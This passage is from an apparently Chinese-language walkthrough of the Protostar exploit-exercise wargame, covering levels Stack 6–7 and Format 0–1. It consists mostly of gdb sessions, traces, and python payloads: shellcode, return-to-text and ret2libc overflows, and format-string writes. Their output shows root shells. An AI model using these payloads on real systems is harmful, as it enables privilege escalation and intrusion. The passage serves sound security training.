</span><span style="color:#d0dfe6;">SYS_mmap2</span><span>(0, 0x144948, 5, 2050, 3)                    </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xb7e97000
</span><span style="color:#d0dfe6;">SYS_mprotect</span><span>(0xb7fd5000, 4096, 0)                     </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_mmap2</span><span>(0xb7fd6000, 12288, 3, 2066, 3)              </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xb7fd6000
</span><span style="color:#d0dfe6;">SYS_mmap2</span><span>(0xb7fd9000, 10568, 3, 50,</span><span style="font-style:italic;color:#95cc5e;"> -1</span><span>)               </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xb7fd9000
</span><span style="color:#d0dfe6;">SYS_close</span><span>(3)                                          </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_mmap2</span><span>(0, 4096, 3, 34,</span><span style="font-style:italic;color:#95cc5e;"> -1</span><span>)                         </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xb7e96000
</span><span style="color:#d0dfe6;">SYS_set_thread_area</span><span>(0xbffffbc0, 0xb7ffeff4, 0xb7e966c0, 1, 0) </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_mprotect</span><span>(0xb7fd6000, 8192, 1)                     </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_mprotect</span><span>(0xb7ffe000, 4096, 1)                     </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_munmap</span><span>(0xb7fdc000, 13796)                         </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">__libc_start_main</span><span>(0x80484fa, 1, 0xbffffd94, 0x8048520, 0x8048510 </span><span style="color:#748aa6;">&lt;</span><span>unfinished ...</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">printf</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">input path please: </span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">&lt;</span><span>unfinished ...</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">SYS_fstat64</span><span>(1, 0xbffff604, 0xb7fd7ff4, 0xb7fd84c0, 0x80485d0) </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_mmap2</span><span>(0, 4096, 3, 34,</span><span style="font-style:italic;color:#95cc5e;"> -1</span><span>)                         </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xb7fdf000
</span><span style="color:#748aa6;">&lt;</span><span>... </span><span style="color:#267fb5;">printf</span><span> resumed</span><span style="color:#748aa6;">&gt; </span><span>)                                </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">19
</span><span style="color:#d0dfe6;">fflush</span><span>(0xb7fd84c0 </span><span style="color:#748aa6;">&lt;</span><span>unfinished ...</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">SYS_write</span><span>(1, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">input path please: </span><span style="color:#516a88;">&quot;</span><span>, 19)               </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">19
</span><span style="color:#748aa6;">&lt;</span><span>... </span><span style="color:#d0dfe6;">fflush</span><span> resumed</span><span style="color:#748aa6;">&gt; </span><span>)                                </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">gets</span><span>(0xbffffc8c, 0, 0xb7fe1b28, 1, 0 </span><span style="color:#748aa6;">&lt;</span><span>unfinished ...</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">SYS_fstat64</span><span>(0, 0xbffffb5c, 0xb7fd7ff4, 0xb7fd8420, 0xb7fd8420) </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_mmap2</span><span>(0, 4096, 3, 34,</span><span style="font-style:italic;color:#95cc5e;"> -1</span><span>)                         </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xb7fde000
</span><span style="color:#d0dfe6;">SYS_read</span><span>(0, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><span style="color:#516a88;">&quot;</span><span>..., 4096) </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">81
</span><span style="color:#748aa6;">&lt;</span><span>... </span><span style="color:#d0dfe6;">gets</span><span> resumed</span><span style="color:#748aa6;">&gt; </span><span>)                                  </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xbffffc8c
</span><span style="color:#d0dfe6;">printf</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">got path %s\n</span><span style="color:#516a88;">&quot;</span><span>, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><span style="color:#516a88;">&quot;</span><span>...) </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">74
</span><span style="color:#d0dfe6;">printf</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">input path please: </span><span style="color:#516a88;">&quot;</span><span>)                         </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">19
</span><span style="color:#d0dfe6;">fflush</span><span>(0xb7fd84c0 </span><span style="color:#748aa6;">&lt;</span><span>unfinished ...</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">SYS_write</span><span>(1, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">got path bbbbbbbbbbbbbbbbbbbbbbb</span><span style="color:#516a88;">&quot;</span><span>..., 93) </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">93
</span><span style="color:#748aa6;">&lt;</span><span>... </span><span style="color:#d0dfe6;">fflush</span><span> resumed</span><span style="color:#748aa6;">&gt; </span><span>)                                </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">gets</span><span>(0xbffffc8c, 0xbffffc8c, 0xb7fe1b28, 1, 0 </span><span style="color:#748aa6;">&lt;</span><span>unfinished ...</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">SYS_read</span><span>(0, </span><span style="color:#516a88;">&quot;&quot;</span><span>, 4096)                                 </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#748aa6;">&lt;</span><span>... </span><span style="color:#d0dfe6;">gets</span><span> resumed</span><span style="color:#748aa6;">&gt; </span><span>)                                  </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">printf</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">got path %s\n</span><span style="color:#516a88;">&quot;</span><span>, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><span style="color:#516a88;">&quot;</span><span>...) </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">98
</span><span style="color:#d0dfe6;">---</span><span> SIGSEGV (Segmentation fault) </span><span style="color:#d0dfe6;">---
</span><span style="color:#d0dfe6;">+++</span><span> killed by SIGSEGV +++
</span><span>
</span></code></pre>
<h2 id="solution-2-return-to-text">solution 2: Return to .text</h2>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> (python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&#39;+(80-29)*&#39;\xcc&#39;+&#39;\xf9\x84\x04\x08&#39;+&#39;\x7c\xfc\xff\xbf&#39;</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">; </span><span style="color:#d0dfe6;">cat</span><span>) </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./stack6
</span><span style="color:#d0dfe6;">input</span><span> path please: got path ▒/sh▒%▒▒▒P▒/binP▒▒1▒
</span><span>                                                </span><span style="color:#d0dfe6;">1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span style="color:#d0dfe6;">id
</span><span style="color:#d0dfe6;">uid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">1001</span><span>(</span><span style="color:#d0dfe6;">user</span><span>) gid=1001(user) </span><span style="color:#d0dfe6;">euid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">0</span><span>(</span><span style="color:#d0dfe6;">root</span><span>) groups=0(root)</span><span style="color:#d0dfe6;">,1001</span><span>(user)
</span></code></pre>
<p>后来发现这个payload是不能复用的，猜测是因为栈地址会变化的原因</p>
<h2 id="solution-3-return-to-libc">solution 3: Return to libc</h2>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) disas main
</span><span style="color:#d0dfe6;">Dump</span><span> of assembler code for function main:
</span><span style="color:#d0dfe6;">0x080484fa </span><span style="color:#748aa6;">&lt;</span><span>main+0</span><span style="color:#748aa6;">&gt;</span><span>:    push   %</span><span style="color:#d0dfe6;">ebp
</span><span style="color:#d0dfe6;">0x080484fb </span><span style="color:#748aa6;">&lt;</span><span>main+1</span><span style="color:#748aa6;">&gt;</span><span>:    mov    %</span><span style="color:#d0dfe6;">esp</span><span>,%</span><span style="color:#d0dfe6;">ebp
</span><span style="color:#d0dfe6;">0x080484fd </span><span style="color:#748aa6;">&lt;</span><span>main+3</span><span style="color:#748aa6;">&gt;</span><span>:    and    $</span><span style="color:#d0dfe6;">0</span><span>xfffffff0,%</span><span style="color:#d0dfe6;">esp
</span><span style="color:#d0dfe6;">0x08048500 </span><span style="color:#748aa6;">&lt;</span><span>main+6</span><span style="color:#748aa6;">&gt;</span><span>:    call   0x8048484 </span><span style="color:#748aa6;">&lt;</span><span>getpath</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">0x08048505 </span><span style="color:#748aa6;">&lt;</span><span>main+11</span><span style="color:#748aa6;">&gt;</span><span>:   mov    %</span><span style="color:#d0dfe6;">ebp</span><span>,%</span><span style="color:#d0dfe6;">esp
</span><span style="color:#d0dfe6;">0x08048507 </span><span style="color:#748aa6;">&lt;</span><span>main+13</span><span style="color:#748aa6;">&gt;</span><span>:   pop    %</span><span style="color:#d0dfe6;">ebp
</span><span style="color:#d0dfe6;">0x08048508 </span><span style="color:#748aa6;">&lt;</span><span>main+14</span><span style="color:#748aa6;">&gt;</span><span>:   ret
</span><span style="color:#d0dfe6;">End</span><span> of assembler dump.
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) b </span><span style="color:#748aa6;">*</span><span>0x80484fd
</span><span style="color:#d0dfe6;">Breakpoint</span><span> 1 at 0x80484fd: file stack6/stack6.c, line 26.
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) r
</span><span style="color:#d0dfe6;">Starting</span><span> program: /opt/protostar/bin/stack6
</span><span>
</span><span style="color:#d0dfe6;">Breakpoint</span><span> 1, 0x080484fd in main (argc=1, argv=0xbffffd54) </span><span style="color:#d0dfe6;">at</span><span> stack6/stack6.c:26
</span><span style="color:#d0dfe6;">26</span><span>      stack6/stack6.c: No such file or directory.
</span><span>        </span><span style="color:#d0dfe6;">in</span><span> stack6/stack6.c
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) p system
</span><span style="color:#d0dfe6;">$2</span><span> = {&lt;text variable, no debug info&gt;} 0xb7ecffb0 </span><span style="color:#748aa6;">&lt;</span><span>__libc_system</span><span style="color:#748aa6;">&gt;
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) p exit
</span><span style="color:#d0dfe6;">$3</span><span> = {&lt;text variable, no debug info&gt;} 0xb7ec60c0 </span><span style="color:#748aa6;">&lt;*</span><span>__GI_exit</span><span style="color:#748aa6;">&gt;
</span><span>
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) info proc map
</span><span style="color:#d0dfe6;">process</span><span> 16347
</span><span style="color:#d0dfe6;">cmdline</span><span> = </span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">/opt/protostar/bin/stack6</span><span style="color:#516a88;">&#39;
</span><span style="color:#d0dfe6;">cwd</span><span> = </span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">/opt/protostar/bin</span><span style="color:#516a88;">&#39;
</span><span style="color:#d0dfe6;">exe</span><span> = </span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">/opt/protostar/bin/stack6</span><span style="color:#516a88;">&#39;
</span><span style="color:#d0dfe6;">Mapped</span><span> address spaces:
</span><span>
</span><span>        </span><span style="color:#d0dfe6;">Start</span><span> Addr   End Addr       Size     Offset objfile
</span><span>         </span><span style="color:#d0dfe6;">0x8048000</span><span>  0x8049000     0x1000          0       /opt/protostar/bin/stack6
</span><span>         </span><span style="color:#d0dfe6;">0x8049000</span><span>  0x804a000     0x1000          0       /opt/protostar/bin/stack6
</span><span>        </span><span style="color:#d0dfe6;">0xb7e96000</span><span> 0xb7e97000     0x1000          0
</span><span>        </span><span style="color:#d0dfe6;">0xb7e97000</span><span> 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
</span><span>        </span><span style="color:#d0dfe6;">0xb7fd5000</span><span> 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
</span><span>        </span><span style="color:#d0dfe6;">0xb7fd6000</span><span> 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
</span><span>        </span><span style="color:#d0dfe6;">0xb7fd8000</span><span> 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
</span><span>        </span><span style="color:#d0dfe6;">0xb7fd9000</span><span> 0xb7fdc000     0x3000          0
</span><span>        </span><span style="color:#d0dfe6;">0xb7fde000</span><span> 0xb7fe2000     0x4000          0
</span><span>        </span><span style="color:#d0dfe6;">0xb7fe2000</span><span> 0xb7fe3000     0x1000          0           </span><span style="color:#748aa6;">[</span><span>vdso</span><span style="color:#748aa6;">]
</span><span>        </span><span style="color:#d0dfe6;">0xb7fe3000</span><span> 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
</span><span>        </span><span style="color:#d0dfe6;">0xb7ffe000</span><span> 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
</span><span>        </span><span style="color:#d0dfe6;">0xb7fff000</span><span> 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
</span><span>        </span><span style="color:#d0dfe6;">0xbffeb000</span><span> 0xc0000000    0x15000          0           </span><span style="color:#748aa6;">[</span><span>stack</span><span style="color:#748aa6;">]
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) find 0xb7e9700,+2000000,</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/bin/sh</span><span style="color:#516a88;">&quot;
</span><span style="color:#d0dfe6;">warning:</span><span> Unable to access target memory at 0xb7e9700, halting search.
</span><span style="color:#d0dfe6;">Pattern</span><span> not found.
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) find 0xb7e97000,+2000000,</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/bin/sh</span><span style="color:#516a88;">&quot;
</span><span style="color:#d0dfe6;">0xb7fba23f
</span><span style="color:#d0dfe6;">warning:</span><span> Unable to access target memory at 0xb7fd9647, halting search.
</span><span style="color:#d0dfe6;">1</span><span> pattern found.
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) x/s 0xb7fba23f
</span><span style="color:#d0dfe6;">0xb7fba23f:      </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">KIND in __gen_tempname</span><span style="color:#4cbbff;">\&quot;</span><span style="color:#516a88;">&quot;
</span></code></pre>
<p>其中一行说到**<code>0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so</code>**，所以libc是装到了这个位置，但是我们找到/bin/sh后查看那个地方却不对</p>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> strings</span><span style="font-style:italic;color:#95cc5e;"> -a -t</span><span> x /lib/libc-2.11.2.so </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">grep</span><span> /bin/sh
</span><span> </span><span style="color:#d0dfe6;">11f3bf</span><span> /bin/sh
</span></code></pre>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) x/s 0xb7fb63bf
</span><span style="color:#d0dfe6;">0xb7fb63bf:      </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/bin/sh</span><span style="color:#516a88;">&quot;
</span></code></pre>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> (python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a&#39;*80+&#39;\xb0\xff\xec\xb7&#39;+&#39;\xc0\x60\xec\xb7&#39;+&#39;\xbf\x63\xfb\xb7&#39;</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">; </span><span style="color:#d0dfe6;">cat</span><span>) </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./stack6
</span><span style="color:#d0dfe6;">input</span><span> path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒▒▒aaaaaaaaaaaa▒▒▒▒`</span><span style="color:#d0dfe6;">췿c▒
</span><span style="color:#d0dfe6;">id
</span><span style="color:#d0dfe6;">uid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">1001</span><span>(</span><span style="color:#d0dfe6;">user</span><span>) gid=1001(user) </span><span style="color:#d0dfe6;">euid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">0</span><span>(</span><span style="color:#d0dfe6;">root</span><span>) groups=0(root)</span><span style="color:#d0dfe6;">,1001</span><span>(user)
</span></code></pre>
<h2 id="solution-4-rop-todo">solution 4: ROP（TODO）</h2>
<h2 id="can-kao-zi-liao">参考资料</h2>
<p>总览：https://resources.infosecinstitute.com/exploiting-protostar-stack-4-7/#gref</p>
<p>总览：http://www.bitforestinfo.com/2018/04/binary-exploitation-protostar-stack6_6.html</p>
<p>ret2.text：http://www.bitforestinfo.com/2018/04/binary-exploitation-protostar-stack6_20.html</p>
<p>ret2libc：https://ohexfortyone.com/2018/03/exploit-exercises-protostar-stack-6.html</p>
<p>ret2libc：https://medium.com/@airman604/protostar-stack7-walkthrough-2aa2428be3e0</p>
<p>ROP：<a rel="noopener nofollow noreferrer" target="_blank" href="https://media.blackhat.com/bh-usa-08/video/bh-us-08-Shacham/black-hat-usa-08-shacham-return-oriented-programming-hires.m4v">blackhat-Return-Oriented Programming: Exploits Without Code Injection</a></p>
<p>ROP：<a rel="noopener nofollow noreferrer" target="_blank" href="https://speakerdeck.com/l4ys/rop-qing-song-tan">ROP轻松谈</a></p>
<h1 id="stack-7">Stack 7</h1>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">msf </span><span style="color:#748aa6;">&gt;</span><span> msfelfscan stack7
</span><span style="color:#d0dfe6;">[*]</span><span> exec: msfelfscan stack7
</span><span>
</span><span style="color:#d0dfe6;">Usage:</span><span> /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/bin/msfelfscan </span><span style="color:#748aa6;">[</span><span>mode</span><span style="color:#748aa6;">] &lt;</span><span>options</span><span style="color:#748aa6;">&gt; [</span><span>targets</span><span style="color:#748aa6;">]
</span><span>
</span><span style="color:#d0dfe6;">Modes:
</span><span>    </span><span style="color:#d0dfe6;">-j,</span><span style="font-style:italic;color:#95cc5e;"> --jump </span><span style="color:#748aa6;">[</span><span>regA,regB,regC</span><span style="color:#748aa6;">]</span><span>      Search for jump equivalent instructions
</span><span>    </span><span style="color:#d0dfe6;">-p,</span><span style="font-style:italic;color:#95cc5e;"> --poppopret</span><span>                  Search for pop+pop+ret combinations
</span><span>    </span><span style="color:#d0dfe6;">-r,</span><span style="font-style:italic;color:#95cc5e;"> --regex </span><span style="color:#748aa6;">[</span><span>regex</span><span style="color:#748aa6;">]</span><span>              Search for regex match
</span><span>    </span><span style="color:#d0dfe6;">-a,</span><span style="font-style:italic;color:#95cc5e;"> --analyze-address </span><span style="color:#748aa6;">[</span><span>address</span><span style="color:#748aa6;">]</span><span>  Display the code at the specified address
</span><span>    </span><span style="color:#d0dfe6;">-b,</span><span style="font-style:italic;color:#95cc5e;"> --analyze-offset </span><span style="color:#748aa6;">[</span><span>offset</span><span style="color:#748aa6;">]</span><span>    Display the code at the specified offset
</span><span>
</span><span style="color:#d0dfe6;">Options:
</span><span>    </span><span style="color:#d0dfe6;">-A,</span><span style="font-style:italic;color:#95cc5e;"> --after </span><span style="color:#748aa6;">[</span><span>bytes</span><span style="color:#748aa6;">]</span><span>              Number of bytes to show after match (-a/-b)
</span><span>    </span><span style="color:#d0dfe6;">-B,</span><span style="font-style:italic;color:#95cc5e;"> --before </span><span style="color:#748aa6;">[</span><span>bytes</span><span style="color:#748aa6;">]</span><span>             Number of bytes to show before match (-a/-b)
</span><span>    </span><span style="color:#d0dfe6;">-D,</span><span style="font-style:italic;color:#95cc5e;"> --disasm</span><span>                     Disassemble the bytes at this address
</span><span>    </span><span style="color:#d0dfe6;">-I,</span><span style="font-style:italic;color:#95cc5e;"> --image-base </span><span style="color:#748aa6;">[</span><span>address</span><span style="color:#748aa6;">]</span><span>       Specify an alternate ImageBase
</span><span>    </span><span style="color:#d0dfe6;">-h,</span><span style="font-style:italic;color:#95cc5e;"> --help</span><span>                       Show this message
</span><span style="color:#d0dfe6;">msf </span><span style="color:#748aa6;">&gt;</span><span> msfelfscan</span><span style="font-style:italic;color:#95cc5e;"> --jump</span><span> eax stack7
</span><span style="color:#d0dfe6;">[*]</span><span> exec: msfelfscan</span><span style="font-style:italic;color:#95cc5e;"> --jump</span><span> eax stack7
</span><span>
</span><span style="color:#d0dfe6;">[stack7]
</span><span style="color:#d0dfe6;">0x080484bf</span><span> call eax
</span><span style="color:#d0dfe6;">0x080485eb</span><span> call eax
</span></code></pre>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> (python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&#39;+(80-29)*&#39;\xcc&#39;+&#39;\xbf\x84\x04\x08&#39;</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">; </span><span style="color:#d0dfe6;">cat</span><span>) </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./stack7
</span><span style="color:#d0dfe6;">input</span><span> path please: got path ▒/sh▒%▒▒▒P▒/binP▒▒1▒
</span><span>                                                </span><span style="color:#d0dfe6;">1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒̿▒▒▒▒▒▒▒▒▒▒▒̿▒
</span><span style="color:#d0dfe6;">id
</span><span style="color:#d0dfe6;">uid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">1001</span><span>(</span><span style="color:#d0dfe6;">user</span><span>) gid=1001(user) </span><span style="color:#d0dfe6;">euid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">0</span><span>(</span><span style="color:#d0dfe6;">root</span><span>) groups=0(root)</span><span style="color:#d0dfe6;">,1001</span><span>(user)
</span></code></pre>
<h1 id="format-0">Format 0</h1>
<h2 id="solution-0-stackoverflow">solution 0: stackoverflow</h2>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a&#39;*64+&#39;\xef\xbe\xad\xde&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">xargs</span><span> ./format0
</span><span style="color:#d0dfe6;">you</span><span> have hit the target correctly :)
</span></code></pre>
<h2 id="solution-1-format-string">solution 1: format string</h2>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span>  python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;%64d\xef\xbe\xad\xde&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">xargs</span><span> ./format0
</span><span style="color:#d0dfe6;">you</span><span> have hit the target correctly :)
</span></code></pre>
<h1 id="format-1">Format 1</h1>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> objdump</span><span style="font-style:italic;color:#95cc5e;"> -t</span><span> format1 </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">grep</span><span> target
</span><span style="color:#d0dfe6;">08049638</span><span> g     O .bss   00000004              target
</span><span style="color:#d0dfe6;">$</span><span> ./format1 `</span><span style="color:#d0dfe6;">python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;\x38\x96\x04\x08A&#39; +&#39;%08x.&#39;*127+&#39;%08n.&#39;+&#39;%08x.&#39;*22</span><span style="color:#516a88;">&quot;</span><span>`
</span><span style="color:#d0dfe6;">8A0804960c.bffff9e8.08048469.b7fd8304.b7fd7ff4.bffff9e8.08048435.bffffbb0.b7ff1040.0804845b.b7fd7ff4.08048450.00000000.bffffa68.b7eadc76.00000002.bffffa94.bffffaa0.b7fe1848.bffffa50.ffffffff.b7ffeff4.0804824d.00000001.bffffa50.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.00000000.00000000.bffffa68.e6b62d35.ccfdbb25.00000000.00000000.00000000.00000002.08048340.00000000.b7ff6210.b7eadb9b.b7ffeff4.00000002.08048340.00000000.08048361.0804841c.00000002.bffffa94.08048450.08048440.b7ff1040.bffffa8c.b7fff8f8.00000002.bffffba6.bffffbb0.00000000.bffffea4.bffffec6.bffffed0.bffffee4.bffffef6.bfffff06.bfffff19.bfffff26.bfffff31.bfffff6f.bfffff86.bfffff97.bfffffa5.bfffffbc.00000000.00000020.b7fe2414.00000021.b7fe2000.00000010.0f8bfbff.00000006.00001000.00000011.00000064.00000003.08048034.00000004.00000020.00000005.00000007.00000007.b7fe3000.00000008.00000000.00000009.08048340.0000000b.000003e9.0000000c.00000000.0000000d.000003e9.0000000e.000003e9.00000017.00000001.00000019.bffffb8b.0000001f.bffffff2.0000000f.bffffb9b.00000000.00000000.00000000.00000000.00000000.4f000000.e6ba1f47.9c250ca2.20d18978.691cdb81.00363836.00000000.2f2e0000.6d726f66.00317461..38302541.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.you</span><span> have modified the target :)
</span></code></pre>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> i=0</span><span style="color:#748aa6;">; while </span><span style="color:#267fb5;">[ </span><span>$</span><span style="color:#d0dfe6;">i </span><span style="font-style:italic;color:#95cc5e;">-le</span><span> 200 </span><span style="color:#267fb5;">]</span><span style="color:#748aa6;">; do </span><span style="color:#d0dfe6;">./format1 </span><span>`</span><span style="color:#d0dfe6;">python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;aaaa%%%03d</span><span style="color:#4cbbff;">\\\$</span><span style="color:#6ee2ff;">08x.&#39; % $</span><span style="color:#d0dfe6;">i</span><span style="color:#516a88;">&quot;</span><span>` </span><span style="color:#748aa6;">; </span><span style="color:#d0dfe6;">i</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">$((i</span><span style="color:#748aa6;">+</span><span style="color:#6ee2ff;">1))</span><span style="color:#748aa6;">; done
